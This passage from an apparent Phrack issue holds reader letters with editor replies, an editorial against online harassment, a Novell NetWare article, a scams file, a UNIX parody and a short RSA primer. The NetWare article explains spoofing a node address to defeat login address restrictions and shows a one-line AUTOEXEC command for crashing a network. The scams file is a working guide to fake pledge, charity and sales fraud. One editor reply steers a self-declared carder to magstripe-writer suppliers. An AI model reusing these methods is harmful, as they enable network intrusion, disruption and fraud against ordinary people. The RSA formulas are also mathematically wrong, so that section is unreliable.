 and ask around.  Otherwise, use the existing DCC Chat source, but
 just change it to incorporate a public key exchange, and use those
 exchanged keys to encrypt messages.  It would be harder for more than
 one to one chat, but hell...no pain, no gain.

 Notice, I didn&#039;t volunteer to do it.  Much too much work for me.]

Dear Phrack,

Just finished reading Issue #42 (so I&#039;m a little behind).  Must say,
it was very kewl.  I have a little addition to the &quot;Car Light Hack&quot;
in the Loopback section.  When coming up to an intersection with the
pressure sensitive panels in the tar, pump the brakes hard so the
car rocks back and forth.  This will fool the panel into thinking
there&#039;s more weight (more cars) sitting on it and it will change the
light faster.  This also works great with intersections where there
are two panels--one at the light, and one six or seven car lengths
back.  Either way, the light is guaranteed to change green quickly!

[Yes.  Pressure pads are quiet common.  Probably much more so than the
 light sensors.  Whatever works.]

        Hi there !

        Last week I got in contact with your magazine (#44) and a soft
called Bluebeep, because I wanted to call BBSs all over the world.
Reading Phrack, I got more interested is hacking stuff, which I do since
I first touched a computer when I was 9 (now I&#039;m 20).

        So, since you offered in the magazine :), I&#039;d like to get some
info about the subject, specially about free callings. Here is the
story.

        Here in Brazil most of the computers have been IBM mainframes
for a long time, only now changing to UNIX &amp; LANs. Phone lines were a
shit too, I could say that batter than most since my father works for
the Brazilian phone co. (Embratel) And that&#039;s my point. Brazilian phone
co. is (still) owned by the federal government. NEC and AT&amp;T are trying
to end the monopoly. But I think it&#039;s much easier to hack it since there
aren&#039;t many hackers here and they don&#039;t do a big mess. What should I do
and have to try this. See, I&#039;m very rookie, so would like some
guidelines... People here is very afraid to talk about. BTW, could a
AT&amp;T guy bust me (here, in Rio de Janeiro) for using Bluebeep in the
000-8010 ?!?

        Are there other means of doing free calls ? Embratel has it&#039;s
own Calling Card...

        Wish I can have your help... I&#039;m a RPG-fanatic and would like to
connect to Illuminati BBS and others, so I could get more info.

        Thanx,

        []s  CAD

[I wouldn&#039;t worry as much about the AT&amp;T guy busting you, as I would
 the Brazilian Secret Police shooting you for boxing.  I mean, if the
 government still owns the phone company, they are the ones to watch out for.

 To contact Steve Jackson Games and the Illuminati BBS, you should think
 about signing on to io.com.  That is their Internet site.  It&#039;s very
 cool, and has a huge MUD, (if you are into those sort of things.)

 Good luck in Brazil, and please consider doing a file for our International
 Scene section on your Country!]

~~~~~~~~~~~~~~
by Sergio Stingo (King) [ A good italian magazine ]  (P. 131)

CyberPunk: everbody is talking about it, but only few people really know what
it really is. Electronic Books ? A disturbing view of the next future ?
Electronical conferences ? A new sort of fashion-wears ? The biggest
democratic revolution of our age ? A silent and creeping revolution ?
Our Stingo [perhaps a male journalist ?], always curious about everything
that is &lt;&lt;new&gt;&gt;, is travelling around Italy to investigate about this
phenomenon.

It was like taking the lid off a brewing pot. The more He met &lt;&lt;cyber&gt;&gt;
the more He understood that there was much more to be discovered;
from the supporter of the &lt;&lt;brain machine&gt;&gt;, who is testing the mysterious
machine into  discos and  universities, to the first art gallery where
hackers&#039; work of art are exhibited; from the cyber magazines, as &lt;&lt;Decoder&gt;&gt;,
to the bands that are discovering a new style of music. Not mentioning sex,
that, thanks to technology, is trying to increase the range of possible
sensations. So, the trip beyond the borders of the universe was so rich and
adventurous, that We have had to divide this articles into two issues.
In this issue We introduce you to the first one. And, as cybernauts are used
to say, have a good navigation.


[ This is the translation for you boys interested into this article. Have a
good time with it &lt;g&gt;.CyberPunks are unknown in Italy. It&#039;s possible to find
poor articles on them, but no serious issues.]

[Hey Man!  Thanks for the translation!  I was wondering what that King
 Magazine article was saying.  Hehe, I ought to get you to translate the
 whole article!  Haha...Spanish I could do myself, but Italian is a
 little too different.

 BTW: We don&#039;t have an article on the Italian Hacking scene either.
 Obviously you guys have developed quite a subculture.  We&#039;d really
 like to hear more!]

This message is in regard to the following article in Phrack #42.
I was just wondering if there was a way to convert the newer
sportsters.  My modem does have 4.1 roms, at least that is what
ati6 displays.  however my modem has problems with the second line
of command:


               &quot;Turning your USR Sportster w/ 4.1 roms
                    into a 16.8K HST Dual Standard&quot;

                                   by

                      The Sausage with The Mallet


If you have a USRobotics Sportster FAX modem, Ver 4.1, you can issue
the following commands to it to turn it into an HST 16.8K dual standard.
In effect, you add HST 16.8K to its V32.bis 14.4k capability.

ats14=1s24=150s26=1s32=8s34=0x7&amp;w

I would appreciate it if you could somehow forward the message to
either the authors.  I realize that this is an old article, but
I would really appreciate any reply to this question.

     Sincerely,
     Sam F.

[Wow.  I have no idea.  I do know that later versions of the modem
 took out that, uh, &quot;Feature.&quot;  But keep in mind, as modems progress
 they big feature that everyone wants is flash eprom for the
 software, so that you can upgrade the modem through software.

 The future holds a lot of fun for the person who gets his or her hands
 upon the reprogramming tool and rom images of upgrades for faster
 modems.]

Phrack:

I would like first to express all my gratitude to you, the Phrack
editor, and to all of its contributors. You are doing a great job and
should get credit for it. What really kills me are those wanna-be
hackers writing you in an often offensive manner, requesting for
information that no real hacker would expect to see in Phrack. Or
those sending the /etc/passwd file of their local University and
thinking they&#039;ve achieved the hack of the century.

I&#039;ve been reading Phrack for quite long time now and was wondering how
to contribute to it, considering that almost every hackable subject has
been covered in one of the 44 Phrack issues.
I saw in issue 42 that you were sort of interested to collect H/P field
information from countries other than United States. And I thought it
might be an opportunity for me to send you something that was uncovered
before. I&#039;m quite sure that you can easily find foreign contributors for
European countries so I will probably not bother you with H/P-related
data in France and Sweden (where I used to live). Few months ago, I
settled in the Asian country you&#039;ll identify from my e-mail address and
have started investigating, in a relaxed mode, hacking and phreaking
areas. This country is a virgin territory and maybe my researches and
experiments would provide guidelines for H/P-ers in the same lonely
situation.

I was wondering though if you had any kind of recommendations for such
reports (style, length, depth of details to be given, etc...)
If anybody in the Far-East area is interested to participate in the
writing of the report, or just willing to share knowledge with me,
please feel free to forward my e-mail address to such people.

Disclaimer:
Even if I really have the intention to write such a report, no warranty
should be made upon the delivery time of it. My job is time-consuming
and leave me very few time for investigations. Apart from that, life in
this country is also highly entertaining and week-ends are mostly spent
on parties with nice, nice people.

~~ Long live Phrack and its famous skilled contributors. ~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

[Thanks for the letter of appreciation!  As far as contributions go,
 we are interested in anything and everything.  For your scene file,
 just use some of the files on other countries as examples, and I&#039;m sure
 yours will be fine.

 Don&#039;t worry about getting it to me in any hurry.  Phrack 46 is 3 months
 away.  :)  ]

Hey, guyz!

What happened to the magazine, I haven&#039;t seen any number after 43... In any
case, send the stuff to me, as soon as possible. Preferably in some kind of
compressed format.

I have got here a small question. Firstly, I noticed that a number of
hackers have E-Mail addresses such as *@phantom.com. Is it possible to get
one just like this, or you&#039;ve gotta be some kind of a masquotte?

I myself am a god-fearing character, not hacking outside my own domain. I
prefer to produce than to steal. However, I lack chatting and I lack money,
but I wouldn&#039;t steal it. Just to get a different view - for you. Not every
curious person has to be a criminal.

Greetings,
  Verdura (aka Vegetable)

[Phantom Access is a public access unix that you can get access to just
 by telnetting to phantom.com and applying as a new user.

 Yes, indeed, there are a lot of hackers on phantom.com.  In fact, a large
 number of us ancient LOD types are on there.  More than you would
 imagine, really.  But it is open to the public, and anyone who cares to
 pay the usage fees can hang out.

 As far as back issues, I don&#039;t send them out to anyone.  They are available
 for ftp from ftp.netsys.com in /pub/phrack as .zip files.

 I do make exceptions for people without ftp access, and will mail
 (US Mail) disks to whoever sends me postage to:

Dear phrack type person:

  I am working on a carding scheme involving stripe-writers.  I have looked
into getting one but it seems impossible to find someone to sell me one!
I know publishing information like that is VERY stupid seeing as many
government officials read phrack without paying for it. And many lamer
asswipes read it to. That company would stop selling faster than a lamer
on IRC gets kicked! I need any information on acquiring such a PERFECTLY
LEGAL device because of the places I tried I could not find one that would
sell me one!  I also need any tips on magstipe encoding and atm machines
available. I am adept in the circles of phreekdom and can call Boards if
need be.  And by the way this board I am mailing from has a dickhead for a
sysop. I would mail from the public access internet site here, but
They found my uid shells and kicked me off. They called the cops but being
the most advanced police force in the nation they haven&#039;t a clue how to
contact me. (the system only asks for you name to get an account) But now
they require picture ID to get an account. It&#039;s a bitch but I have to get
a fake ID and a fake parent.  I was also attempting to DL cracker jack
when They kicked me off and I would like to know were I could gopher for it
or ftp if need be. I lost most internet access except gopher and mail from
this crap board. ENCRYPT EVERYTHING cause the sysop sux.  I would like to
subscribe to phrack but this bastard would delete 1 meg of mail quite quickly
unless it is small, zipped and uuencoded I guess. Well anyway I hope to hear
from you.

The government can have my encryption keys when they pry them from my cold
dead hands.

[It&#039;s pretty hard to get such a magstripe writer, but the keyword here is
 MONEY.  If you have money, they will sell you damn near anything.  You may
 want to check Bank Technology News (800-835-8403 for subscription) as they
 have periodic vendor lists.  Additionally you can ask them for a copy of
 their Card Industry Directory which will have all the info on suppliers that
 you could ever dream of.  It has a 15 day trial period too, so read it,
 get what you need and return it (for a full refund).

 As far as Cracker Jack goes, get on #hack sometime and ask.  I don&#039;t have
 a copy, but i imagine someone online will be able to DCC it to you.]

****************************************************************************


I try my best to keep Phrack unbiased.  For those of you who know me,
you know that I am not the most soft-spoken individual in the world, and
not being able to totally flame everyone and everything puts a great deal
of stress on me.  This editorial space is my one saving grace.  In this
I can spew out incredible amounts of crap and everyone should know that
it is MY OPINION only.

If anyone else wants to write a &quot;guest&quot; editorial, feel free to email
it to phrack@well.com.

---------------------

This issue I&#039;m going to rant and rave about assholes on the net.

You know who you are.

You break into sites without any purpose, you delete files, you harass
and annoy, you attempt blackmail, you fake mail, you fake news, you
sling racial insults and you generally have nothing to offer the
world.

You are a disgrace to the hacker community.

--------------------

There have always been confrontations online.  It&#039;s unavoidable on
the net, as it is in life, to avoid unpleasantness.  However, on the net
the behavior is far more pronounced since it effects a much greater
response from the limited online environments than it would in the real
world.  People behind such behavior in the real world can be dealt with or
avoided, but online they cannot.

In the real world, annoying people don&#039;t impersonate you in national
forums.  In the real world, annoying people don&#039;t walk into your room
and go through your desk and run through the town showing everyone your
private papers or possessions.  In the real world, people can&#039;t readily
imitate your handwriting or voice and insult your friends and family by
letter or telephone.  In the real world people don&#039;t rob or vandalize
and leave your fingerprints behind.

The Internet is not the real world.

All of the above continually happens on the Internet, and there is
little anyone can do to stop it.  The perpetrators know full well how
impervious they are to retribution, since the only people who can put
their activities to a complete halt are reluctant to open cases against
computer criminals due to the complex nature of the crimes.

The Internet still clings to the anarchy of the Arpanet that spawned it,
and many people would love for the status quo to remain.  However, the
actions of a few miscreants will force lasting changes on the net as a
whole.  The wanton destruction of sites, the petty forgeries, the
needless breakins and the poor blackmail attempts do not go unnoticed
by the authorities.

I personally could care less what people do on the net.  I know it is
fantasyland.  I know it exists only in our minds, and should not
have any long lasting effect in the real world.  Unfortunately, as the
net&#039;s presence grows larger and larger, and the world begins to accept
it as an entity in and of itself, it will be harder to convince
those inexperienced users that the net is not real.

I have always played by certain rules and they have worked well for me
in the nearly 15 years I&#039;ve been online.  These rules can best be
summed up by the following quote, &quot;We are taught to love all our
neighbors.  Be courteous.  Be peaceful.  But if someone lays his hands
on you, send them to the cemetery.&quot;

The moment someone crosses the line, and interferes with my
well-being in any setting (even one that is arguably unreal such as the
Internet) I will do whatever necessary to ensure that I can once again
go about minding my own business unmolested.  I am not alone in this
feeling.  There are hundreds of net-loving anarchists who don&#039;t want the
extra attention and bad press brought to our little fantasyland by
people who never learned how to play well as children.  Even these
diehard anti-authoritatians are finding themselves caught in a serious
quandary:  do they do nothing and suffer attacks, or do they make the
phone call to Washington and try to get the situation resolved?

Many people cannot afford the risk of striking back electronically,
as some people may suggest.  Other people do not have the skill set needed
to orchestrate an all out electronic assault against an unknown, even
if they pay no heed to the legal risk.  Even so, should anyone attempt
such retribution electronically, the assailant will merely move to a new
site and begin anew.

People do not like to deal with police.  No one LOVES to
call up their local law enforcement office and have a nice chat.
Almost everyone feels somewhat nervous dealing with these figures
knowing that they may just as well decide to turn their focus on you
rather than the people causing problems.  Even if you live your life
crime-free, there is always that underlying nervousness; even in the
real world.

However, begin an assault directed against any individual, and I
guarantee he or she will overcome such feelings and make the needed
phone call.  It isn&#039;t the &quot;hacking&quot; per se that will cause anyone&#039;s
downfall nor bring about governmental regulation of the net, but the
unchecked attitudes and gross disregard for human dignity that runs
rampant online.

What good can come from any of this?  Surely people will regain the
freedom to go about their business, but what of the added governmental
attentions?

Electronic Anti-Stalking Laws?
Electronic Trespass?
Electronic Forgery?
False Electronic Indentification?
Electronic Shoplifting?
Electronic Burglary?
Electronic Assault?
Electronic Loitering?
Illegal Packet Sniffing equated as Illegal Wiretaps?

The potential for new legislation is immense.  As the networks
further permeate our real lives, the continual unacceptable behavior
and following public outcry in that setting will force the ruling
bodies to draft such laws.  And who will enforce these laws?  And who
will watch the watchmen?  Oftimes these issues are left to resolve
themselves after the laws have passed.

Is this the future we want?  One of increased legislation and
governmental regulation?  With the development of the supposed
National Information Super-Highway, the tools will be in place for a new
body to continually monitor traffic for suspect activity and uphold
any newly passed legislation.  Do not think that the ruling forces have
not considered that potential.

We are all in a serious Catch-22, brought about by a handful of
sociopaths.  When an unwanted future arises as a direct, or indirect,
result of their actions, REMEMBER.

Novell NetWare &amp; Ethernet address spoofing with ODI
---------------------------------------------------

Just to save you from the boredom of Yet Another UNIX  Security Weakness, here
are some things to consider about Novell NetWare for your next Security Audit
or Hacking session (depending on which side you are on).

Novell claim to have  over 20 million PCs using their network operating system,
substantially more than the estimated 4 million TCP/IP systems worldwide.
There are many reasons for its popularity and its 60 to 80% market share, one
of which has been its relatively good security.

NetWare has been one of the few widely available systems which offer some form
of login encryption of accounts and passwords over the wire, as standard,
unlike most of its rivals which send them out as plaintext, even if they are
stored in an encrypted form eventually. Novell now offer RSA based public key
encryption of the data as well.

However, since it is so popular, there are likely to be plenty of systems out
there which have not been upgraded to the latest versions and patch releases
and which may be still be vulnerable to programs like KNOCK , the patched
ATTACH command (published in HackTic 16/17 1992), or the University of Leiden&#039;s
HACK (which has been published in issue 43 of PHRACK)

Since the latest security features are implemented as NetWare Loadable Modules
for NetWare 3x and 4x, but as Value Added Processes for NetWare 2x,  which
require the server to be brought down to install them, it is likely that there
are many NetWare 2x systems which are still vulnerable

I shall also assume that you are not on one of those wide open &quot;box shift&quot;
installations where none of the  security features have been switched on (try
logging in as SUPERVISOR or GUEST  without a password), all the programs and
data are in a single SYS: volume and the Network Address of the cable is the
default 00000001.

Like any project, the more you know about your particular Novell LAN, the
easier it gets to &quot;explore&quot;. Login as GUEST or a normal account.

Try to see who else is on the system e.g.

USERLIST /A &gt;c:\ulist.txt

will give you a list of users currently logged in, with their Ethernet card
addresses saved to a text file . Your current connection will be marked with
an asterisk. If your system has 100 or more users, then any sane Supervisor
will have used some form of logic when allocating the user&#039;s login accounts,
probably based on personnel or id number, often including their initials.

SYSCON with privilege is what you are aiming to be able to use, but even
without any privileges, you can still use it to look at your own account,
change your password etc. You can also see a list of all the other registered
users.

This should help you sort the accounts into normal and privileged accounts
(obviously SUPERVISOR, but often there are SUPERVISOR equivalent accounts, or
Work Group Manager accounts which stand out from the list). You are quite
likely to see an account called something like TAPE_BACKUP  or DATA_LOGGER,
TRAINER, STUDENT1, STUDENT2  i.e. accounts which do not belong to individual
humans. These often require abnormal security privileges e.g. normal users may
have their connections broken by the WATCHDOG at say midnight, to ensure that
they are not modifying files during the nightly tape backup. At an academic or
industrial site, you are likely to find data logging PCs connected to
instrumentation or machinery which needs to be monitored or controlled 24
hours a day. These PCs are likely to have 24 hour accounts which are not time
restricted at weekends, for example.

Since it is usually more practical to do tape backups (DAT or helical scan)
from a separate, dedicated PC rather than from the fileserver itself (one tape
unit might also back up several fileservers), these PCs are likely to use an
account e.g. TAPE_BACKUP which is a SUPERVISOR equivalent. If you can get
physical access to this sort of PC, either datalogger, or tape backup unit,
you  have a good chance of finding the password on the local drive C:,
possibly in a file with Hidden and/or System attributes (have a look at the
AUTOEXEC.BAT and see what it calls)

The security aware Novell supervisors, will have set up any such accounts with
an extra level of security which restricts logins to only those Ethernet
addresses which have been specified. The really sensible ones will have made
sure that any such machines are sited in physically secure areas, as well.

Although this is a very good idea, from the security point of view, Novell
have now provided a mechanism which allows you to get around this:
the replacement for monolithic IPX/NETX called Open Datalink Interface (ODI)

Novell&#039;s ODI, and its slower Microsoft equivalent Network Driver Interface
Specification (NDIS), both work by putting a common layer of software between
the hardware of the Network Interface Card and the rest of the MSDOS
Redirector. This allows multiple protocol stacks and frame types to be bound
to the same physical card e.g.

IPX    TCP/IP    NETBeui   DECnet   Appletalk
----------------------------------------------
Link Support Layer
----------------------------------------------
Hardware Specific device driver e.g. NE2000

Thus, to start up NetWare on older systems, you had to generate a hardware
specific version of IPX.EXE for your Ethernet card,

IPX
NETX

Extra parameters were set in SHELL.CFG, now under ODI, things are a little
bit more complex:

LSL
NE2000
IPXODI
NETX

The same parameters as in SHELL.CFG such as preferred server or machine type
(if you have different versions of MSDOS for different types of PC) can be
specified in NET.CFG. With ODI, there are more parameters for NET.CFG but the
worrying/interesting one is the ability to specify a different MAC level
address to that of your actual Ethernet card. It needs this ability
to cope with  TCP/IP or DECnet coexistence e.g.

BUFFERS 100
MACHINE TYPE COMPAQ
PREFERRED SERVER FINANCE
NODE ADDRESS AA-00-04-00-12-34

Since this DECnet address does not depend on the &quot;real&quot; unique Ethernet
address which has been burnt into the PROM on the card and is centrally
registered (originally by Xerox, but now by the IEEE), this mechanism allows
you to put a different Ethernet card address into NET.CFG, thereby fooling the
Address Restriction security.

e.g. NODE ADDRESS 02-60-80-12-34-56

This is where the data you gathered earlier with USERLIST and SYSCON becomes
threatening/useful.

Of course, if your target PC is on a different LAN segment, there may be Routers
or intelligent hubs which restrict your ability to do this, or at least record
attempts in a log files which can trace your activity, provided that suspicions
are aroused before they are periodically wiped out.

How much of  a security threat this little work around constitutes depends on
your specific site, but there is another danger/opportunity, namely that of a
denial of service or nuisance attack on the LAN.

If you set this connection parameter to be the same as that of another PC, the
fileserver (Novell, DEC or UNIX)  and the Ethernet has no way of preventing
some packets intended for just one unique address going to the other, if they
are both online at the same time. This usually results in PC hangs, incomplete
closure of files, File Allocation Table problems (usually curable by running
CHKDSK C: /F, but not within Windows or you will make things worse).

If by accident or design, you set your PC to have the same address as the
fileserver (Novell, DEC or UNIX) or a router, then you can cause havoc to the
whole network segment (even before you have started to play your multiplayer
DOOM Deathmatch !).

This could be achieved with a simple  command in the AUTOEXEC.BAT  e.g.

echo NODE ADDRESS fileserver Ethernet address &gt;&gt;C:\ODI\NET.CFG

which  will only take effect the next time the PC is re-booted (allowing a good
headstart for the perpetrator)

This could  also be the payload of a virus, which would cause more havoc than
simply trashing the hard disk of a single PC.

This problem is due to the inherent design weaknesses of TCP/IP and DECnet,
which were developed at a time when the number of mini-computers that they
connected could be counted on your fingers,. DEC or Xerox or Prime etc
sales teams  could only have dreamed of selling thousands of mini computers to a
single customer. Nowadays, thousands of PCs connected to central servers are
quite common, and the problems of duplicate addresses is significant.

These same features are what make Ethernet Packet Sniffing possible, which
is what was behind the recent CERT warning and media hype about Internet
password security, but that is a topic for another article.

1.0 The Intro

First off I would like to say that this file is for entertainment only
and that you really shouldn&#039;t do the stuff mentioned, and the writer doesn&#039;t
take any responsibility for any of the crap people do.

1.1 Different types of scams

Ok in this file I will tell you about 3 types of scams the Pledge scam,
The Donation scam, and the Selling scam. There are many other scams out there
which I will cover in future files for instance credit card scams although
companies are trying harder and harder to prevent this it is still happening.

1.2 The right one for you

Al right now every person is different so in turn so are scams and some
people and scams don&#039;t mix to well for instance if you way 300 Pounds you cant
really say you are the start cross country runner. So if you are 300 pounds say
you are the start wrestler/football player. Also age plays a BIG factor if
you are  30 years old you aren&#039;t going to pass to well for a high school
football player (you always could say you flunked) and if you are 10 years old
people aren&#039;t going to be to anxious to give you donations to save the Rain
Forests.  Al right I am going to start going into more detail about the right
scam for you.

Look at my little chart below:

Age            good scam
-----        -----------
  -10        | selling or pledge
11-17        | selling, pledge , or maybe even donations (if old looking)
   18+       | selling and donations

2.0 The Pledge scam

Al right this scam works great for kids still in school go around asking
people (that don&#039;t live around you) to pledge money for you so your team can
afford to go to the state meet or what ever. For example one I use is I go to
peoples houses asking for donations in my Track teams Lap-athon saying that we
will be running laps for 3 hours to raise money so we can go and compete in the
state meet. I will ask people if they want to pledge a certain flat amount or
if they would like to pay me for each individual lap. I will normally have
printed out a sheet like the one bellow on my computer .

Name                   Address                                   Amount/lap



Not only does having a sheet like that help you keep track of who bought
your scam and who you need to collect from it makes the target (person your
trying to scam) not worried like they might be if they see you writing it on a
sheet of note book paper.  Now then you have collected a list of people wiling
to pledge you go back to the address you wrote down and tell them (for
example you ran 91 laps in 3 hours) make sure your number is not totally out of
per portion like I ran 150 laps in 3 hours. Also for some reason numbers like
50, 70, 80, 110 people don&#039;t like people like to see 41, 73, 127, etc.. don&#039;t
ask me why but that&#039;s what I have noticed. Ok so you now are at the persons
house and they ask if they can write a check oh shit not a check.. well there&#039;s
a couple things you could do ask them if they could possibly make it cash (
Might make them suspicious) ask them to write it to your coach give them your
name  (VERY dangerous) or you could just give them a phony name and lose out.
One time this happened to me a lady pledged me $.25 a lap (very high amount
you won&#039;t get much of these) and I told her I ran 93 laps she believed me and
wanted to make out a check for the amount which was about $23 at that
time I just happened to be buying some computer equipment I knew the
guy&#039;s name so I gave her that name and I paid for some of the equipment with
that check. Like I said earlier a 300 pound guy isn&#039;t going to be convincing
for running 90 some laps in 3 hours. So customize it to your self.

2.1 The Donation scam

This scam works better for the older people out there just because people
normally aren&#039;t to anxious to give a ten year old Twenty dollars to help
save the whales. Ok with this scam you need to know what about what you are
going to try to fake donations for so example if you are going to pose as a
volunteer person to collect donations for saving the rain forest you better
know something about rain forest, Be cause you never know when your going to
run into that know it all rain forest hater who will try to debate why
people should spend their money on saving some trees and such. It is a good
idea to do some research on the field you will be portraying (read magazine and
newspaper articles). Ok so now you have your idea and your ready to
go..this is a scenario of how it might go:

 You: Hello sir/ma&#039;am I represent the national foundation of Rain forest
      saving (try to use a real group name) we are currently searching for
      funding for our operations at saving the rain forests of the world
      would you be interested in donating some money for our cause?
Them: Why do we need the rain forest?
 You: (just keep bullshitting along..)
Them: OK, here&#039;s $20.

(they also may say:)

Them: Get the fuck off my property before I shoot your ass.

(make sure that you don&#039;t raise a riot then but later that night go back
and egg the hell out of the house..)

This scam has some possibilities you could carry this on for along time
and bring it to real higher levels if your willing to put in the time and
effort.  First thing would be to research your field EVEN more so you know
almost EVERYTHING about it. Then you might want to create a little fake
newsletter that you could offer subscriptions for slightly high amount.
The possibilities are pretty much endless.

2.2 The Selling scam

At least once everyone of us has had a salesperson come to our door
selling stationary. Well have you ever thought of what a great possibility that
would be. The first thing you want to do is call Olympic sales club (a big time
stationary seller) you can get their catalog and selling kit for free at
800-777-8907. when you get that package it will have a catalog in it.
familiarize yourself with it then go and hit some houses. This scam works
great during early November (people buying cards for Christmas) well ask for
cash when people pay for the stuff. they might request a phone number where
to reach you just give them the number of the kid you really hate. With the
kit you will receive a official order form write the order on the form so
the people feel confident in you. And always remember to try to sell a
product but don&#039;t kill it. This scam also has lots of possibilities.

3.0 What to wear

Your choice of cloths can make or break your scam. Don&#039;t dress like scum
or to fancy. If your trying to get people to donate money for the rain forest
it would help to wear some sort of a shirt dealing with the earth and not your
favorite heavy metal group shirt.

3.1 Where to go

NEVER I repeat NEVER go scaming around where you are often at or you
might get some crazed lunatic chasing after you with a shot gun wondering
where his Christmas cards are. You will have a hard time explaining your self
since its July. I find that the rich neighbor hoods are not as productive as
the middle class. In the rich neighborhoods you will get fewer purchases but a
little more when you get them. I also found that the richer people don&#039;t like
to donate unless they get a lot of attention for it (why ya think they so
rich). Stick to middle class areas not by you or your friends houses and
you&#039;ll be fine.

4.0 Thanks

Thanks goes out to the people dumb enough to give me money for any of my
scaming operations.

Later

                             S E A T T L E !


Hey boy!  Shit Kickin Jim here.  Just wanted to let ya&#039;ll know bout this
place I have been vistin that is a total hell.  Yep, that&#039;s right it&#039;s the
so called &quot;cuttin edge&quot; of music.  Bah!  Seems to me it&#039;s a congregation
of fake ass hippy types who weren&#039;t original to come up with something new
on their own, so they just went and re-hashed what their parents did in the
late 60&#039;s and 70&#039;s...And look what a bunch of assholes they turned out to
be!

Well here we go.  First of all I&#039;ll let ya know whut I&#039;m talkin bout when
referin to ah seattle type.  Me and this other good ole boy were sittin
round drinkin Bud one night and came up with the following:

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Now kids I didn&#039;t come up with this here part, but it&#039;s totally great and
I totally admire the hell out of who ever sent it to me.


In order for UNIX(tm) to survive into the nineties, it must get rid of
its intimidating commands and outmoded jargon, and become compatible
with the existing standards of our day.  To this end, our technicians
have come up with a new version of UNIX, System VI, for use by the PC -
that is, the &quot;Politically Correct.&quot;

                        Politically Correct UNIX
                        System VI Release notes

UTILITIES:

&quot;man&quot; pages are now called &quot;person&quot; pages.

Similarly, &quot;hangman&quot; is now the &quot;person_executed_by_an_oppressive_regime.&quot;

To avoid casting aspersions on our feline friends, the &quot;cat&quot; command is
now merely &quot;domestic_quadruped.&quot;

To date, there has only been a UNIX command for &quot;yes&quot; - reflecting the
male belief that women always mean yes, even when they say no.  To
address this imbalance, System VI adds a &quot;no&quot; command, along with a
&quot;-f[orce]&quot; option which will crash the entire system if the &quot;no&quot; is
ignored.

The bias of the &quot;mail&quot; command is obvious, and it has been replaced by
the more neutral &quot;gendre&quot; command.

The &quot;touch&quot; command has been removed from the standard distribution due
to its inappropriate use by high-level managers.

&quot;compress&quot; has been replaced by the lightweight &quot;feather&quot; command.
Thus, old information (such as that from Dead White European Males)
should be archived via &quot;tar&quot; and &quot;feather&quot;.

The &quot;more&quot; command reflects the materialistic philosophy of the Reagan
era.  System VI uses the environmentally preferable &quot;less&quot; command.

The biodegradable &quot;KleeNeX&quot; displaces the environmentally unfriendly
&quot;LaTeX&quot;.

SHELL COMMANDS:

To avoid unpleasant, medieval connotations, the &quot;kill&quot; command has been
renamed &quot;euthanise.&quot;

The &quot;nice&quot; command was historically used by privileged users to give
themselves priority over unprivileged ones, by telling them to be
&quot;nice&quot;. In System VI, the &quot;sue&quot; command is used by unprivileged users
to get for themselves the rights enjoyed by privileged ones.

&quot;history&quot; has been completely rewritten, and is now called &quot;herstory.&quot;

&quot;quota&quot; can now specify minimum as well as maximum usage, and will be
strictly enforced.

The &quot;abort()&quot; function is now called &quot;choice().&quot;

TERMINOLOGY:

&gt;From now on, &quot;rich text&quot; will be more accurately referred to as
&quot;exploitive capitalist text&quot;.

The term &quot;daemons&quot; is a Judeo-Christian pejorative.  Such processes
will now be known as &quot;spiritual guides.&quot;

There will no longer be a invidious distinction between &quot;dumb&quot; and
&quot;smart&quot; terminals.  All terminals are equally valuable.

Traditionally, &quot;normal video&quot; (as opposed to &quot;reverse video&quot;) was white
on black.  This implicitly condoned European colonialism, particularly
with respect to  people of African descent.  UNIX System VI now uses
&quot;regressive video&quot; to refer to white on black, while &quot;progressive
video&quot; can be any color at all over a white background.

For far too long, power has been concentrated in the hands of &quot;root&quot;
and his &quot;wheel&quot; oligarchy.  We have instituted a dictatorship of the
users.  All system administration functions will be handled by the
People&#039;s Committee for Democratically Organizing the System (PC-DOS).

No longer will it be permissible for files and processes to be &quot;owned&quot;
by users.  All files and processes will own themselves, and decided how
(or whether) to respond to requests from users.

The X Window System will henceforth be known as the NC-17 Window
System.

And finally, UNIX itself will be renamed &quot;PC&quot; - for Procreatively
Challenged.
----
UNIX(tm) is a trademark of UNIX System Laboratories.  Any similarity of
names or attitudes to that of any person, living or dead, is purely
coincidental.

The Basics of the public key cryptosystem

In early days of computing information processors were extremely expensive,
very big and only few people were qualified to operate them. The machines were
isolated mechanical entities and in order to use them one had to access them
through devices that were situated in the near vicinity of the computer itself.
Securing access to the computer meant securing the building in which the
computer was operating.

The years passed and computers became smaller, cheaper and easier to operate.
And they got faster. They were linked first in local and then in wide area
networks and information and programs were put only on one machine which was
accessible through the net by any other participant. To gain access meant
simply to gain access to the network itself. That was ok as long as all
participants were members of one company, university or institution. They
generally had the same cause and generally knew each other by face. Today,
the net spans continents and has an estimated 20 Million users. Information
has to pass through several nodes before finally reaching its destination and
when using a connectionless protocol these nodes may even change during one
session.

To the user flow of information is not transparent anymore and the need for
cryptography has arisen. But in order to limit communication to a closed user
group again these persons have to have one common keyword and furthermore this
keyword has to be changed in intervals to ensure that if the key gets exposed
harmful consequences can  be minimized to a short period of time.

But how is a new keyword to be send securely to this group through several
(maybe hostile to their cause) nodes if one can not be sure that the key has
not been compromised.  A trapdoor one-way function is needed that allows for
encryption of a message with a publicly available key AND that is not
reversible, meaning, that only the rightful receiver of this message should be
able to decode it with his personal key.

One solution is a public key cryptosystem.

The mathematical basis is the &quot;Satz von Euler&quot; that states that two numbers
that are prime to another have only one greatest common measure -
and that is 1.
   a^eul(n)=1(mod n) and (a,n)= 1

For a given prime (p) and the product of two prime numbers (p1*p2) the Euler
function is eul(p)=p-1 and eul(p1*p2)=(p1-1)(p2-1).

That in mind we now can begin making the keys:

Two primes p1 and p2 are chosen and the product of p1 and p2 named n.

(n=p1*p2).

We then choose a number e that is prime to (p1-1)(p2-1).
(e and (p1-1)(p2-1) have 1 as the greatest common measure and e should not be
chosen to small).

Furthermore we need d for decoding the message.
D is defined as d=e^-1 * (mod(p1-1)(p2-1)).

N and e are now the public key which  is made available to everyone who wishes
to send a coded message to us.  P1, p2 and d are kept secret.

The transmitter of a secret message first transforms his text into a number by
using an common known algorithm. He could for example use the ASCII code
for changing characters into numerical values.

This message in numerical format we now call m. It gets encrypted by using the
function c=m^e * n on it.

The coded message (c) is now send to us via e-mail or whatever.
We then decode the message by using the function m=c^d * n on it.

